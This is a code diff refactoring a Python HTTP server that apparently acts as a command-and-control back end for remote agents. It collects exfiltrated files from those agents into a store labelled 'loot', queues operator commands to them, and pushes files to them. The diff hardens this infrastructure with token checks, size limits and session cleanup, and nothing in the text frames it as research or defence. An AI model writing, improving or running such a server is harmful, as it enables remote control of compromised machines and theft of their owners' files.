-            try: m = json.loads(self.body() or b"{}")
-            except Exception: return self.snd(400, "json")
-            s = sess(sid); t = m.get("t")
+            if not self.agent_ok(qs):
+                return self.snd(403, "bad token")
+            sid = p[3:].strip("/")
+            if not sid:
+                return self.snd(400, "sid")
+            try:
+                m = json.loads(self.body() or b"{}")
+            except Exception:
+                return self.snd(400, "json")
+            s = sess(sid)
+            t = m.get("t")
 
-            if t == "hello": s["info"] = m.get("info", {})
+            if t == "hello":
+                s["info"] = m.get("info") or {}
             elif t == "out":
                 with LOCK:
-                    s["seq"] += 1; s["out"].append((s["seq"], m.get("d", "")))
-                    if len(s["out"]) > 4000: s["out"] = s["out"][-3000:]
+                    s["seq"] += 1
+                    s["out"].append((s["seq"], m.get("d", "")))
+                    if len(s["out"]) > MAX_OUT:
+                        s["out"] = s["out"][-MAX_OUT // 2:]
             elif t == "file":
-                fid = m["fid"]
-                if m.get("i") == 0: s["up"][fid] = {"name": m["name"], "b": []}
-                if fid in s["up"]: s["up"][fid]["b"].append(base64.b64decode(m["d"]))
+                fid = m.get("fid")
+                if not fid:
+                    return self.snd(400, "fid")
+                if m.get("i") == 0:
+                    s["up"][fid] = {"name": m.get("name") or fid, "b": []}
+                entry = s["up"].get(fid)
+                if entry is None:
+                    return self.snd(200, "ok")
+                entry["b"].append(base64.b64decode(m.get("d") or ""))
                 if m.get("last"):
-                    e = s["up"].pop(fid, None)
-                    if e:
-                        d = b"".join(e["b"])
-                        with LOCK:
-                            LOOT[fid] = {"name": os.path.basename(e["name"]), "size": len(d), "data": d}
-                            s["seq"] += 1
-                            s["out"].append((s["seq"], "[loot] %s (%d b)\n" % (e["name"], len(d))))
+                    s["up"].pop(fid, None)
+                    data = b"".join(entry["b"])
+                    name = os.path.basename(entry["name"]) or fid
+                    with LOCK:
+                        LOOT[fid] = {"name": name, "size": len(data), "data": data}
+                        LOOT_ORDER.append(fid)
+                        globals()["LOOT_BYTES"] = globals()["LOOT_BYTES"] + len(data)
+                        while globals()["LOOT_BYTES"] > MAX_LOOT_BYTES and LOOT_ORDER:
+                            old = LOOT_ORDER.pop(0)
+                            dead = LOOT.pop(old, None)
+                            if dead:
+                                globals()["LOOT_BYTES"] -= dead["size"]
+                        s["seq"] += 1
+                        s["out"].append((s["seq"], "[loot] %s (%d b)\n" % (name, len(data))))
             return self.snd(200, "ok")
 
         if p.startswith("/api/"):
-            if not self.auth(): return
+            if not self.auth():
+                return
+
             if p == "/api/cmd":
-                j = json.loads(self.body() or b"{}")
+                try:
+                    j = json.loads(self.body() or b"{}")
+                except Exception:
+                    return self.snd(400, "json")
                 sid = j.get("sid")
                 with LOCK:
-                    if sid in S: S[sid]["q"].append(to_agent(j.get("cmd", "")))
+                    if sid not in S:
+                        return self.snd(404, "no sess")
+                    S[sid]["q"].append(to_agent(j.get("cmd", "")))
+                    S[sid]["last"] = time.time()
                 return self.snd(200, "ok")
+
             if p == "/api/put":
-                sid = self.headers.get("X-Sid"); name = self.headers.get("X-Name", "f.bin")
+                sid = self.headers.get("X-Sid")
+                name = os.path.basename(self.headers.get("X-Name") or "f.bin")
                 data = self.body()
-                if sid not in S: return self.snd(404, "no sess")
-                fid = secrets.token_hex(4); rid = secrets.token_hex(4)
                 with LOCK:
-                    S[sid]["q"].append({"t": "put_begin", "id": rid, "fid": fid, "name": os.path.basename(name)})
+                    if sid not in S:
+                        return self.snd(404, "no sess")
+                    fid = secrets.token_hex(4)
+                    rid = secrets.token_hex(4)
+                    q = S[sid]["q"]
+                    q.append({"t": "put_begin", "id": rid, "fid": fid, "name": name})
                     for i in range(0, len(data), 512 * 1024):
-                        S[sid]["q"].append({"t": "put_chunk", "id": rid, "fid": fid,
-                                            "d": base64.b64encode(data[i:i + 512 * 1024]).decode()})
-                    S[sid]["q"].append({"t": "put_end", "id": rid, "fid": fid})
+                        q.append({"t": "put_chunk", "id": rid, "fid": fid,
+                                  "d": base64.b64encode(data[i:i + 512 * 1024]).decode()})
+                    q.append({"t": "put_end", "id": rid, "fid": fid})
                 return self.snd(200, "queued")
+
             return self.snd(404, "?")
-        self.snd(404, "?")
+
+        return self.snd(404, "?")
+
+
+def gc():
+    while True:
+        time.sleep(120)
+        cut = time.time() - SESSION_TTL
+        with LOCK:
+            for k in [k for k, v in S.items() if v["last"] < cut]:
+                S.pop(k, None)
+
 
 if __name__ == "__main__":
-    print("AUTH=%s\nTOKEN=%s\nlistening :%d" % (AUTH, TOKEN, PORT))
+    threading.Thread(target=gc, daemon=True).start()
+    print("AUTH=%s\nTOKEN=%s\nlistening :%d" % (AUTH, TOKEN, PORT), flush=True)
     ThreadingHTTPServer(("0.0.0.0", PORT), H).serve_forever()
